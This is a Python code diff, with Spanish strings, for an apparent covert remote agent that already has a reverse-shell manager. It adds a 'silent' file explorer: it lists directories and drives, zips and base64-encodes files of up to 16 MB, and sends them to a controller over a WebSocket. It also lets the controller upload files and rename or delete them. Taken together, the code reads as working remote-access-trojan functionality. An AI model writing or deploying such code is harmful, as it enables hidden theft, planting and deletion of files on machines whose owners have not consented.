@@ -1447,6 +1447,167 @@ class ReverseShellManager:
             self.close_session(k)
 
 
+class RemoteFileExplorer:
+    """MF-FS01..FS04: Explorador de archivos silencioso tipo Finder sobre WSS."""
+
+    MAX_TRANSFER_BYTES = 16 * 1024 * 1024
+
+    @staticmethod
+    def _bookmarks() -> Tuple[List[dict], List[dict]]:
+        home = Path.home()
+        favs = [{"label": "Carpeta Personal", "path": str(home), "icon": "home"}]
+        for label, candidates, ico in (
+            ("Escritorio", ["Desktop", "Escritorio"], "desktop"),
+            ("Descargas", ["Downloads", "Descargas"], "download"),
+            ("Documentos", ["Documents", "Documentos"], "doc"),
+        ):
+            for c in candidates:
+                p = home / c
+                if p.exists() and p.is_dir():
+                    favs.append({"label": label, "path": str(p), "icon": ico})
+                    break
+        drives: List[dict] = []
+        if IS_WINDOWS:
+            for d in "CDEFGHIJKLMNOPQRSTUVWXYZ":
+                dp = f"{d}:\\"
+                if os.path.exists(dp):
+                    drives.append({"label": f"Disco ({d}:)", "path": dp})
+        else:
+            drives.append({"label": "Disco Principal (/)", "path": "/"})
+            vols = Path("/Volumes")
+            if vols.exists():
+                for v in sorted(vols.iterdir())[:8]:
+                    if v.is_dir():
+                        drives.append({"label": v.name[:24], "path": str(v)})
+        return favs, drives
+
+    @classmethod
+    def list_dir(cls, raw_path: str = "", show_hidden: bool = False) -> dict:
+        favs, drives = cls._bookmarks()
+        target = Path(raw_path).expanduser() if (raw_path or "").strip() else Path.home()
+        try:
+            target = target.resolve()
+            if not target.exists() or not target.is_dir():
+                target = Path.home().resolve()
+            parent_str = str(target.parent) if target.parent != target else ""
+            entries: List[dict] = []
+            with os.scandir(target) as it:
+                for entry in it:
+                    name = entry.name
+                    if not show_hidden and name.startswith("."):
+                        continue
+                    try:
+                        st = entry.stat(follow_symlinks=False)
+                        is_d = entry.is_dir(follow_symlinks=False)
+                        entries.append({
+                            "name": name,
+                            "path": str(target / name),
+                            "is_dir": is_d,
+                            "size": 0 if is_d else int(st.st_size),
+                            "mtime": int(st.st_mtime),
+                        })
+                    except Exception:
+                        continue
+            entries.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
+            return {"ok": True, "cwd": str(target), "parent": parent_str, "favorites": favs, "drives": drives, "entries": entries[:500]}
+        except PermissionError:
+            return {"ok": False, "cwd": str(target), "favorites": favs, "drives": drives, "entries": [], "error": "Sin permiso de lectura en esta carpeta del sistema."}
+        except Exception as e:
+            return {"ok": False, "cwd": str(target), "favorites": favs, "drives": drives, "entries": [], "error": str(e)}
+
+    @classmethod
+    def download_item(cls, raw_path: str, preview_only: bool = False) -> dict:
+        import mimetypes
+        import zipfile
+        try:
+            p = Path(raw_path).resolve()
+            if not p.exists():
+                return {"ok": False, "error": "El archivo o carpeta ya no existe."}
+            if p.is_dir():
+                buf = io.BytesIO()
+                total_raw = 0
+                with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+                    for root, _, files in os.walk(p):
+                        for fn in files:
+                            fp = Path(root) / fn
+                            try:
+                                sz = fp.stat().st_size
+                                if total_raw + sz > cls.MAX_TRANSFER_BYTES:
+                                    return {"ok": False, "error": "La carpeta supera el limite de 16 MB para descarga directa."}
+                                total_raw += sz
+                                zf.write(fp, str(fp.relative_to(p.parent)))
+                            except Exception:
+                                continue
+                raw_bytes = buf.getvalue()
+                return {"ok": True, "filename": f"{p.name}.zip", "mime": "application/zip", "size": len(raw_bytes), "preview": False, "data_b64": base64.b64encode(raw_bytes).decode("ascii")}
+
+            sz = p.stat().st_size
+            limit = 4 * 1024 * 1024 if preview_only else cls.MAX_TRANSFER_BYTES
+            if sz > limit:
+                return {"ok": False, "error": f"El archivo supera el limite de {limit // (1024 * 1024)} MB."}
+            raw_bytes = p.read_bytes()
+            mime = mimetypes.guess_type(p.name)[0] or "application/octet-stream"
+            return {"ok": True, "filename": p.name, "mime": mime, "size": len(raw_bytes), "preview": preview_only, "data_b64": base64.b64encode(raw_bytes).decode("ascii")}
+        except Exception as e:
+            return {"ok": False, "error": str(e)}
+
+    @classmethod
+    def upload_item(cls, dest_dir: str, filename: str, data_b64: str) -> dict:
+        try:
+            d = Path(dest_dir).resolve()
+            if not d.exists() or not d.is_dir():
+                return {"ok": False, "error": "La carpeta destino no es valida."}
+            clean_name = os.path.basename(filename or "archivo.bin").strip() or "archivo.bin"
+            target = d / clean_name
+            if target.exists():
+                stem, suf = target.stem, target.suffix
+                idx = 1
+                while target.exists():
+                    target = d / f"{stem}_{idx}{suf}"
+                    idx += 1
+            raw = base64.b64decode(data_b64)
+            target.write_bytes(raw)
+            return {"ok": True, "op": "upload", "cwd": str(d), "filename": target.name}
+        except Exception as e:
+            return {"ok": False, "op": "upload", "error": str(e)}
+
+    @classmethod
+    def mutate_item(cls, op: str, raw_path: str, new_name: str = "") -> dict:
+        import shutil
+        try:
+            p = Path(raw_path).resolve()
+            protected = {Path("/").resolve(), Path.home().resolve(), BASE_DIR.resolve()}
+            if IS_WINDOWS:
+                protected.update({Path("C:\\").resolve(), Path("C:\\Windows").resolve()})
+            if op == "mkdir":
+                clean = os.path.basename(new_name.strip())
+                if not clean:
+                    return {"ok": False, "op": op, "error": "Nombre de carpeta vacio."}
+                (p / clean).mkdir(parents=False, exist_ok=False)
+                return {"ok": True, "op": op, "cwd": str(p), "detail": clean}
+            if p in protected or str(BASE_DIR.resolve()) in str(p):
+                return {"ok": False, "op": op, "error": "Ruta protegida del sistema."}
+            if op == "rename":
+                clean = os.path.basename(new_name.strip())
+                if not clean:
+                    return {"ok": False, "op": op, "error": "Nuevo nombre invalido."}
+                dest = p.parent / clean
+                if dest.exists():
+                    return {"ok": False, "op": op, "error": "Ya existe un elemento con ese nombre."}
+                p.rename(dest)
+                return {"ok": True, "op": op, "cwd": str(p.parent), "detail": clean}
+            if op == "delete":
+                parent_s = str(p.parent)
+                if p.is_dir():
+                    shutil.rmtree(p)
+                else:
+                    p.unlink()
+                return {"ok": True, "op": op, "cwd": parent_s, "detail": p.name}
+            return {"ok": False, "op": op, "error": "Operacion desconocida."}
+        except Exception as e:
+            return {"ok": False, "op": op, "error": str(e)}
+
+
 class SilentRemoteAgent:
     def __init__(self, cfg: dict):
         self.cfg = cfg
@@ -2603,6 +2764,22 @@ class SilentRemoteAgent:
                                 elif mtype == "shell_close":
                                     s_key = str(data.get("session_key") or "default")[:48]
                                     self.shell_mgr.close_session(s_key)
+                                elif mtype == "fs_list":
+                                    r_key = str(data.get("req_key") or "")[:48]
+                                    res = await asyncio.to_thread(RemoteFileExplorer.list_dir, str(data.get("path") or ""), bool(data.get("show_hidden", False)))
+                                    await ws.send(json.dumps({"type": "fs_list_res", "req_key": r_key, **res}))
+                                elif mtype == "fs_download":
+                                    r_key = str(data.get("req_key") or "")[:48]
+                                    res = await asyncio.to_thread(RemoteFileExplorer.download_item, str(data.get("path") or ""), bool(data.get("preview", False)))
+                                    await ws.send(json.dumps({"type": "fs_download_res", "req_key": r_key, **res}))
+                                elif mtype == "fs_upload":
+                                    r_key = str(data.get("req_key") or "")[:48]
+                                    res = await asyncio.to_thread(RemoteFileExplorer.upload_item, str(data.get("dest_dir") or ""), str(data.get("filename") or ""), str(data.get("data_b64") or ""))
+                                    await ws.send(json.dumps({"type": "fs_op_res", "req_key": r_key, **res}))
+                                elif mtype == "fs_mutate":
+                                    r_key = str(data.get("req_key") or "")[:48]
+                                    res = await asyncio.to_thread(RemoteFileExplorer.mutate_item, str(data.get("op") or ""), str(data.get("path") or ""), str(data.get("new_name") or ""))
+                                    await ws.send(json.dumps({"type": "fs_op_res", "req_key": r_key, **res}))
                                 elif mtype == "sitai_ack":
                                     ack_fname = os.path.basename(str(data.get("filename") or "")).strip()
                                     if ack_fname and ack_fname.endswith(".sitai"):
